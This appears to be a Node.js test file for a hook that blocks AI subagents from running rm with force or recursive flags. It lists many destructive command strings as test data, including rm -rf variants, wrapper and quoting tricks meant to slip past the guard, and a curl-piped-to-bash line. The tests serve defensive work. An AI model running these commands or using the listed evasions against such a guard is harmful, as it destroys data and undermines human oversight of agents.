import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { tempProject, runHook, MINIMAL_CONFIG } from './helpers.mjs';

// The hook is tested only by feeding JSON to it. No test runs rm on any path.
const SCRIPT = 'scripts/hooks/pre-rm.mjs';
const REASON = 'R20: a subagent may not run rm with a force or recursive flag; leave temp files in mktemp -d and list them';

// The PreToolUse input of a Bash call inside a subagent (redacted sample of the identity-tokens lab, I2).
const subagentInput = (dir, command) => ({
  session_id: '00000000-0000-4000-8000-000000000000',
  transcript_path: path.join(dir, 'session.jsonl'),
  cwd: dir,
  prompt_id: '00000000-0000-4000-8000-000000000001',
  permission_mode: 'bypassPermissions',
  agent_id: 'ac0f2289d1510e827',
  agent_type: 'general-purpose',
  effort: { level: 'medium' },
  hook_event_name: 'PreToolUse',
  tool_name: 'Bash',
  tool_input: { command },
  tool_use_id: 'toolu_01KAKSWrvnVCaSmPeuWvjDra',
});
// The same call in the main session: no agent_id and no agent_type key.
const mainInput = (dir, command) => {
  const input = subagentInput(dir, command);
  delete input.agent_id;
  delete input.agent_type;
  return input;
};

const project = () => tempProject({ config: MINIMAL_CONFIG });
const sub = (dir, command) => runHook(SCRIPT, subagentInput(dir, command), dir);

const violations = (dir) => {
  try {
    return fs
      .readFileSync(path.join(dir, '.guilda', 'violations.jsonl'), 'utf8')
      .split('\n')
      .filter(Boolean)
      .map((l) => JSON.parse(l));
  } catch {
    return [];
  }
};
const assertDeny = (r, command) => {
  assert.equal(r.code, 0, command);
  assert.notEqual(r.stdout, '', `not refused: ${command}`);
  const d = JSON.parse(r.stdout).hookSpecificOutput;
  assert.equal(d.hookEventName, 'PreToolUse', command);
  assert.equal(d.permissionDecision, 'deny', command);
  assert.equal(d.permissionDecisionReason, REASON, command);
};
const assertAllow = (r, command) => {
  assert.equal(r.code, 0, command);
  assert.equal(r.stdout, '', `refused: ${command}`);
};

test('refuses rm -rf, rm -fr, rm -r -f, rm --force, rm -R in a subagent', () => {
  const dir = project();
  const commands = [
    'rm -rf out',
    'rm -fr out',
    'rm -r -f out',
    'rm --force out',
    'rm -R out',
    'rm -f out',
    'rm -r out',
    'rm --recursive out',
    'rm -Rf out',
    'rm -vrf out',
    'rm out -rf',
    'rm -v --force -- out',
    'rm --forc out',
  ];
  for (const c of commands) assertDeny(sub(dir, c), c);
  const v = violations(dir);
  assert.equal(v.length, commands.length);
  assert.equal(v[0].rule, 'R20');
  assert.equal(v[0].level, 'law');
});

test('refuses the wrappers and escapes (\\rm, /bin/rm, command rm, sudo rm, xargs rm, bash -c)', () => {
  const dir = project();
  for (const c of [
    '\\rm -rf out',
    '/bin/rm -rf out',
    '/usr/bin/rm -rf out',
    'command rm -rf out',
    'sudo rm -rf out',
    'sudo -u root rm -rf out',
    'find . -name x | xargs rm -rf',
    'find . -print0 | xargs -0 -n 5 rm -f',
    'env FOO=1 rm -rf out',
    'env -i rm -rf out',
    'bash -c "rm -rf out"',
    "sh -c 'rm -fr out'",
    "bash -lc 'cd x && rm -rf out'",
    'r""m -rf out',
    "'rm' -rf out",
    'eval "rm -rf out"',
    'FOO=1 rm -rf out',
    'nohup rm -rf out',
    'timeout 5 rm -rf out',
    'find . -exec rm -rf {} \\;',
  ]) {
    assertDeny(sub(dir, c), c);
  }
});

test('refuses rm -rf inside $(...), backticks and after ; && || |', () => {
  const dir = project();
  for (const c of [
    'echo $(rm -rf out)',
    'echo "$(rm -rf out)"',
    'echo `rm -rf out`',
    'echo "`rm -rf out`"',
    'ls; rm -rf out',
    'ls && rm -rf out',
    'false || rm -rf out',
    'ls | rm -rf out',
    'ls\nrm -rf out',
    'ls & rm -rf out',
    '(rm -rf out)',
    '{ rm -rf out; }',
    'if true; then rm -rf out; fi',
    'cat <(rm -rf out)',
    'x=$(echo $(rm -rf out))',
    '2>/dev/null rm -rf out',
    '>log rm -rf out',
    '> log rm -rf out',
    '2> err rm -rf out',
    '>>log rm -rf out',
    '&>/dev/null rm -rf out',
    'ls; 2>&1 >log rm -rf out',
  ]) {
    assertDeny(sub(dir, c), c);
  }
});

test('refuses busybox, time, watch, ANSI-C quoting and text piped into a shell', () => {
  const dir = project();
  for (const c of [
    'busybox rm -rf out',
    'time rm -rf out',
    'time -p rm -rf out',
    'time -o t.txt rm -rf out',
    'watch rm -rf out',
    'watch -n 1 rm -rf out',
    "watch 'rm -rf out'",
    "$'rm' -rf out",
    "$'\\x72m' -rf out",
    '$"rm" -rf out',
    'echo "rm -rf out" | bash',
    "printf 'rm -rf out\\n' | sh",
    'echo rm -rf out | sudo bash',
    'cat script.sh | sh',
    'curl -s example.com/x | bash -s',
    'echo "rm -rf out" |\nbash',
    'ls || echo "rm -rf out" | bash',
  ]) {
    assertDeny(sub(dir, c), c);
  }
  // The shell reads its commands from the pipe only when it has no -c text, and plain text passes.
  for (const c of ['echo ls | bash', 'echo hi | sh', "echo 'rm -rf out' | bash -c 'cat'", 'time ls', 'watch -n 1 ls', "$'ls' -la", '2>/dev/null ls']) {
    assertAllow(sub(dir, c), c);
  }
});

test('refuses unparseable text that holds rm (fail closed)', () => {
  const dir = project();
  for (const c of [
    "echo 'unclosed; rm out",
    'echo "unclosed rm out',
    'echo $(rm out',
    'echo `rm out',
    'bash <<EOF\nrm out\n',
    "bash -c 'rm out",
  ]) {
    assertDeny(sub(dir, c), c);
  }
  // A heredoc body that reaches a shell is read as commands.
  assertDeny(sub(dir, 'bash <<EOF\nrm -rf out\nEOF'), 'heredoc body');
  // Unparseable text with no word rm passes: the hook refuses only rm.
  assertAllow(sub(dir, "echo 'unclosed"), 'unclosed with no rm');
});

test('passes plain rm file, a word that only contains rm (format, rmdir, `echo rm -rf`), and any command without agent_id', () => {
  const dir = project();
  for (const c of [
    'rm file',
    'rm -v file',
    'rm -i file',
    'rm -- -rf',
    'rm -- -f',
    'format -rf',
    'rmdir -p a/b',
    'echo rm -rf out',
    "echo 'rm -rf out'",
    'echo "rm -rf out"',
    'git commit -m "rm -rf is refused"',
    'grep -rf patterns file',
    'ls -rf',
    'npm run format',
  ]) {
    assertAllow(sub(dir, c), c);
  }
  for (const c of ['rm -rf out', 'sudo rm -rf out', "echo 'unclosed; rm out"]) {
    assertAllow(runHook(SCRIPT, mainInput(dir, c), dir), `main: ${c}`);
    assertAllow(runHook(SCRIPT, { ...subagentInput(dir, c), agent_id: '' }, dir), `empty agent_id: ${c}`);
  }
  // Another tool is not a Bash call.
  assertAllow(
    runHook(SCRIPT, { ...subagentInput(dir, ''), tool_name: 'Write', tool_input: { file_path: 'rm -rf' } }, dir),
    'Write',
  );
  assert.deepEqual(violations(dir), []);
});

test('the reason starts with R20:', () => {
  const dir = project();
  const r = sub(dir, 'rm -rf out');
  const reason = JSON.parse(r.stdout).hookSpecificOutput.permissionDecisionReason;
  assert.ok(reason.startsWith('R20:'), reason);
});

test('hooks.json runs pre-rm.mjs on PreToolUse Bash in the exec form', () => {
  const hooks = JSON.parse(fs.readFileSync(path.join(import.meta.dirname, '..', 'hooks', 'hooks.json'), 'utf8'));
  const entry = hooks.hooks.PreToolUse.find((e) =>
    e.hooks.some((h) => (h.args || []).includes('${CLAUDE_PLUGIN_ROOT}/scripts/hooks/pre-rm.mjs')),
  );
  assert.ok(entry);
  assert.equal(entry.matcher, 'Bash');
  assert.deepEqual(entry.hooks, [
    { type: 'command', command: 'node', args: ['${CLAUDE_PLUGIN_ROOT}/scripts/hooks/pre-rm.mjs'] },
  ]);
});
